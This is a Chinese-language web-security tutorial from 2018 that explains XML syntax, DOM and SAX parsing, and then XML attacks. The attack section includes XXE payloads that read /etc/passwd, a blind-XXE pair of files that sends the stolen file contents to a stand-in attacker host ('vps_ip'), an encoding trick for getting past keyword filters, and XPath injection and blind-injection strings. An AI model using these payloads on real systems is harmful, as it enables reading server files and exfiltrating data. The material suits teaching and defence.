# 由浅入深剖析xml及其安全隐患

阅读量 **412181**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-08-13 14:30:00

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t013759a3c369a91c39.jpg)

## 前言

本文用来归纳并深入理解xml语言及其在web环境中可能存在的安全隐患。

## xml基本概念

###  什么是xml？

XML 指可扩展标记语言（EXtensible Markup Language），是一种标记语言，很类似 HTML。其设计宗旨是传输数据，而非显示数据。  
XML 标签没有被预定义。所以需要自行定义标签。

###  什么是标记语言？

标记语言，是一种将文本以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。与文本相关的其他信息（包括文本的结构和表示信息等）与原来的文本结合在一起，但是使用标记进行标识。  
标记语言不仅仅是一种语言，就像许多语言一样，它需要一个运行时环境，使其有用。提供运行时环境的元素称为用户代理。

###  标记语言的不同点

  * 1.标记语言

被读取的，本身没有行为能力（被动）；例如：Html 、XML等

  * 2.编程语言

需要编译执行；本身具有逻辑性和行为能力例如：C、Java等

  * 3.脚本语言

需要解释执行；本身具有逻辑性和行为能力；例如：javascript等

###  归纳

所以说xml本身是一种语言，所以它具有本身语言的特性，和需要完成的功能  
下面我们看看xml如何发挥自身语言的作用，实现功能

## xml基础语法

###  xml声明

xml文档是由一组使用唯一名称标识的实体组成的。始终以一个声明开始，这个声明指定该文档遵循XML1.0的规范。

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    

encodeing是指使用的字符编码格式有UTF-8,GBK,gb2312等等  
（这里插一嘴，既然可以设置编码格式，就有可能存在bypass，后续讲）

###  根元素

每个XML文件都必须有且只能有一个根元素。用于描述文档功能。可以自定义根元素。下例中的root为根元素。

    
    
    <root>...................</root>
    

###  XML代码

根据应用需要创建自定义的元素和属性。标签包括尖括号以及尖括号中的文本。元素是XML内容的基本单元。元素包括了开始标签、结束标签和标签之间的内容。

    
    
    <title>XML是可扩展标记语言</title>
    

###  处理指令

凡是以`<?`开始，`?>`结束的都是处理指令。XML声明就是一个处理指令。  
字符数据分以下两类：  
PCDATA（是指将要通过解析器进行解析的文本）  
CDATA （是指不要通过解析器进行解析的文本）  
其中不允许`CDATA`块之内使用字符串`]]>`,因为它表示CDATA块的结束。

###  实体

实体分为两类：

  * 一般实体(格式：&实体引用名;)
  * 参数实体(格式：%实体引用名;)  
一般实体，可以在XML文档中的任何位置出现的实体称为一般实体。实体可以声明为内部实体还是外部实体。  
外部实体分SYSYTEM及PUBLIC两种：  
SYSYTEM引用本地计算机，PUBLIC引用公共计算机，外部实体格式如下：

    
    
    <!ENTITY 引用名 SYSTEM(PUBLIC) "URI地址">
    

DOCTYPE声明  
在XML文档中，`<!DOCTYPE[...]>`声明跟在XML声明的后面。实体也必须在DOCTYPE声明中声明。  
例如

    
    
    <?xml version="1.0" unicode="UTF-8">
    <!DOCTYPE[
    .....在此声明实体<!ENTITY 实体引用名 "引用内容">
    ]>
    

完整的例子

    
    
    <?xml version="1.0" encoding="GBK"?>
    <!DOCTYPE root[
    <!ENTITY sky1 "引用字符1">
    <!ENTITY sky2 "引用字符2">
    ]>
    <root>
    <title value="&sky1;"> &sky2; </title>
    <title2>
    <value><a>&sky2;</a></value>
    </title2>
    </root>
    

## xml解析方式

首先xml是被读取的标记语言，他不可能自我解析，所以需要脚本语言或者编译语言对其进行读取然后解析。  
这里以Java中主要的两种解析读取方法为例（解析上来说大多大同小异，以java为代表）  
xml解析的方式分为两种：

  * DOM方式
  * SAX方式

###  DOM方式

DOM方式即以树型结构访问XML文档：  
一棵DOM树包含全部元素节点和文本节点。可以前后遍历树中的每一个节点。  
例如

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <DataSource>
        <database name="mysql" version="5.0">
            <driver>com.mysql.jdbc.Driver</driver>
            <url>jdbc:mysql://localhost:3306/linkinjdbc</url>
            <user>root</user>
            <password>root</password>
        </database>
    
        <database name="Oracle" version="10G">
            <driver>oracle.jdbc.driver.OracleDriver</driver>
            <url>jdbc:oracle:thin:@127.0.0.1:linkinOracle</url>
            <user>system</user>
            <password>root</password>
        </database>
    </DataSource>
    

解析后大概如下  
  
然后再对树操作，进行查找

###  SAX方式

SAX处理的特点是基于事件流的。分析能够立即开始，而不是等待所有的数据被处理。而且，由于应用程序只是在读取数据时检查数据，因此不需要将数据存储在内存中。这对于大型文档来说是个巨大的优点。  
事实上，应用程序甚至不必解析整个文档；它可以在某个条件得到满足时停止解析。sax分析器在对xml文档进行分析时,触发一系列的事件,应用程序通过事件处理函数实现对xml文档的访问。  
因为事件触发是有时序性的,所以sax分析器提供的是一种对xml文档的顺序访问机制,对于已经分析过的部分,不能再重新倒回去处理。  
此外，它也不能同时访问处理2个tag，sax分析器在实现时,只是顺序地检查xml文档中的字节流,判断当前字节是xml语法中的哪一部分,检查是否符合xml语法并且触发相应的事件。对于事件处理函数的本身,要由应用程序自己来实现。  
SAX解析器采用了基于事件的模型，它在解析XML文档的时候可以触发一系列的事件，当发现给定的tag的时候，它可以激活一个回调方法，告诉该方法制定的标签已经找到。  
所以对于上述xml内容

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <DataSource>
        <database name="mysql" version="5.0">
            <driver>com.mysql.jdbc.Driver</driver>
            <url>jdbc:mysql://localhost:3306/linkinjdbc</url>
            <user>root</user>
            <password>root</password>
        </database>
    
        <database name="Oracle" version="10G">
            <driver>oracle.jdbc.driver.OracleDriver</driver>
            <url>jdbc:oracle:thin:@127.0.0.1:linkinOracle</url>
            <user>system</user>
            <password>root</password>
        </database>
    </DataSource>
    

它的解析流程为：

    
    
    开始解祈XML文档...
    
    开始解祈元素[DataSource]...
    共有[0]个属性...
    开始接受元素中的字符串数据...
    
    开始解祈元素[database]...
    共有[2]个属性...
    属性名是：name;属性值是:mysql
    属性名是：version;属性值是:5
    开始接受元素中的字符串数据...
    
    开始解祈元素[driver]...
    共有[0]个属性...
    开始接受元素中的字符串数据...
    com.mysql.jdbc.Driver
    解祈元素[driver]结束...
    
    开始解祈元素[url]...
    共有[0]个属性...
    开始接受元素中的字符串数据...
    jdbc:mysql://localhost:3306/linkinjdbc
    解祈元素[url]结束...
    
    .......
    解祈元素[database]结束...
    
    开始解祈元素[database]...
    共有[2]个属性...
    属性名是：name;属性值是:Oracle
    属性名是：version;属性值是:10G
    开始接受元素中的字符串数据...
    
    
    .....
    解祈元素[database]结束...
    解祈元素[DataSource]结束...
    

大概如上，这样即可顺序访问，知道找到需要访问的值，即可回调返回结束

###  优缺点对比

DOM形:

  * 优点： 
    * 整个 Dom 树都加载到内存中了，所以允许随机读取访问数
    * 允许随机的对文档结构进行增删
  * 缺点： 
    * 整个 XML 文档必须一次性解析完，耗时。
    * 整个 Dom 树都要加载到内存中，占内存。
  * 适用于：文档较小，且需要修改文档内容  
SAX形:

  * 优点： 
    * 访问能够立即进行，不需要等待所有数据被加载
    * 不需要将整个数据都加载到内存中，占用内存少
    * 允许注册多个Handler,可以用来解析文档内容，DTD约束等等
  * 缺点： 
    * 需要应用程序自己负责TAG的处理逻辑（例如维护父/子关系等），文档越复杂程序就越复杂。
    * 单向导航，无法定位文档层次，很难同时访问同一文档的不同部分数据，不支持XPath。
    * 不能随机访问 xml 文档，不支持原地修改xml。
  * 适用于：文档较大，只需要读取文档数据。

## 安全隐患

xml作为数据存储/传递的一种标记语言，一定是会在通讯，交互等时候被使用的，那么编译语言/脚本语言需要读取xml来读取数据的时候，势必会解析xml格式的文本内容  
那么在解析的时候，如果攻击者可以控制xml格式的文本内容，那么就可以让编译语言/脚本语言接收到恶意构造的参数，若不加过滤，则会引起安全隐患

###  XXE-任意文件读取

在上述的语法中，我们提及到，xml可以引入实体，例如

    
    
    <!ENTITY 引用名 SYSTEM(PUBLIC) "URI地址">
    

我们可以看到，这里填写的是url地址，这就可以涉及到多个问题：  
1.url协议多样，例如：file、http、gopher……  
2.是否可以请问外部实体  
这里我们先做一个简单的测试，使用file协议，引入实体  
php代码如下

    
    
    <?php
    $xml= file_get_contents("./xxepayload.txt");
    $data = simplexml_load_string($xml,'SimpleXMLElement',$options=LIBXML_NOENT);
    print_r($data);
    ?>
    

xml内容如下:

    
    
    <?xml version = "1.0"?>
    <!DOCTYPE ANY [
        <!ENTITY f SYSTEM "file:///etc/passwd">
    ]>
    <x>&f;</x>
    

访问后可得到回显  
这是为什么？  
因为

    
    
    <!ENTITY f SYSTEM "file:///etc/passwd">
    

此处将本地计算机中`file:///etc/passwd`文件的内容取出，赋值给了实体`f`  
然后实体`f`的值作为元素`x`中的字符串数据被php解析的时候取出，作为对象里的内容  
然后再输出该对象的时候被打印出来。  
故此，倘若我们可以控制xml文本内容，那么就能利用编译/脚本语言的解析，输出我们想读的指定文件

###  XXE-任意文件盲读取

我们知道在Xml解析内容可以被输出的时候，我们可以采取上述攻击方式  
但有时候，xml只作为数据的传递方式，服务端解析xml后，直接将数据进一步处理再输出，甚至不输出，这时候可能就无法得到我们想读的结果。  
那么此时，可以尝试使用blind xxe进行攻击：  
1.我们可以利用file协议去读取本地文件  
2.我们可以利用http协议让实体被带出  
我们知道xml中，跟的是url地址

    
    
    <!ENTITY 引用名 SYSTEM(PUBLIC) "URI地址">
    

那么此时我们当然可以使用http协议，那么xml解析的时候势必会去访问我们指定的url链接  
此时就有可能将数据带出  
我们想要的方法是这样的

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % param1 "file:///etc/passwd">
    <!ENTITY % param2 "http://vps_ip/?%param1">
    %param2;
    ]>
    

此时xml解析时，就会将我们读取到的内容的param1实体带出，我们再vps的apache log上就可以看到  
但是上述构造存在语法问题  
于是我们想到这样一个构造方案  
post.xml

    
    
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % remote SYSTEM "http://vps_ip/evil.xml">
    %remote;
    %all;
    ]>
    <root>&send;</root>
    

evil.xml

    
    
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://vps_ip/1.php?file=%file;'>">
    

这样一来，在解析xml的时候：  
1.file实体被赋予`file:///etc/passwd`的内容  
2.解析remote值的时候，访问`http://vps_ip/evil.xml`  
3.在解析`evil.xml`中all实体的时候，将file实体带入  
4.访问指定url链接，将数据带出  
于是成功造成了blind xxe文件读取

这里再额外提及一下，既然我们再开始申明的时候可以规定编码格式，那么倘若后台对

    
    
    ENTITY
    

等关键词进行过滤时，我们可以尝试使用UTF-7，UTF-16等编码去Bypass  
例如

    
    
    <?xml version="1.0" encoding="UTF-16"?>
    

###  Xpath注入

xml同样可作为数据存储，所以这里可以将其当做数据库  
类似于如下

    
    
    <?xml version="1.0" encoding="UTF-8"?> 
    <users> 
    
    <user> 
    <firstname>Ben</firstname>
    <lastname>Elmore</lastname> 
    <loginID>abc</loginID> 
    <password>test123</password> 
    </user> 
    
    <user> 
    <firstname>Shlomy</firstname>
    <lastname>Gantz</lastname>
    <loginID>xyz</loginID> 
    <password>123test</password> 
    </user> 
    
    <user> 
    <firstname>Jeghis</firstname>
    <lastname>Katz</lastname>
    <loginID>mrj</loginID> 
    <password>jk2468</password> 
    </user> 
    
    <user> 
    <firstname>Darien</firstname>
    <lastname>Heap</lastname>
    <loginID>drano</loginID> 
    <password>2mne8s</password> 
    </user> 
    
    </users>
    

其查询语句，也类似于sql语句

    
    
    //users/user[loginID/text()=’abc’ and password/text()=’test123’]
    

所以相同的，我们可以用类似sql注入的方式来闭合引号例如：

    
    
    loginID=' or 1=1 or ''='
    password=' or 1=1 or ''='
    

可以得到

    
    
    //users/user[loginID/text()='' or 1=1 or ''='' and password/text()='' or 1=1 or ''='']
    

那么查询语句将返回 true

###  Xpath盲注

方法类似于Sql注入，只是函数可能使用不同  
提取当前节点的父节点的名称：

    
    
    ' or substring(loginID(parent::*[position()=1]),1,1)='a
    ' or substring(loginID(parent::*[position()=1]),1,1)='b
    ' or substring(loginID(parent::*[position()=1]),1,1)='c
    ....
    ' or substring(loginID(parent::*[position()=1]),2,1)='a
    ' or substring(loginID(parent::*[position()=1]),2,1)='b
    ....
    

如此循环可得到一个完整的父节点名称  
确定address节点的名称后，攻击者就可以轮流攻击它的每个子节点，提取出它们的名称与值。（通过索引）

    
    
    'or substring(//user[1]/*[2]/text(),1,1)='a' or 'a'='a
    'or substring(//user[1]/*[2]/text(),1,1)='b' or 'a'='a
    'or substring(//user[1]/*[2]/text(),1,1)='c' or 'a'='a
    .....
    

同时，既然将xml用作数据库，有可能存在泄漏问题,例如

    
    
    accounts.xml
    databases.xml
    ...
    

这里还有一道实例题，有兴趣的可以参考一下

    
    
    http://skysec.top/2018/07/30/ISITDTU-CTF-Web/#Access-Box
    

###  代码注入

这一块可以参考我之前写过的soap总结

    
    
    http://skysec.top/2018/07/25/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/
    

既然xml作为标记语言，需要后台解析  
那么我们在传递参数的时候，就可以插入标记语言  
（就像html可以被插入，导致xss一样）  
在后端解析的时候，就可以达到伪造的目的

## 参考链接

<https://blog.csdn.net/u011794238/article/details/42173795>  
<http://blog.51cto.com/12942149/1929669>  
<https://blog.csdn.net/Holmofy/article/details/78130039>  
<https://blog.csdn.net/u011721501/article/details/43775691>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一叶飘零** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/155328](/post/id/155328)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [XXE](/tag/XXE)
  * [Web安全](/tag/Web安全)
  * [xml](/tag/xml)

 **+1** __14赞

 __收藏

![](https://p0.ssl.qhimg.com/t0115eb10739cb26739.png) 一叶飘零

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

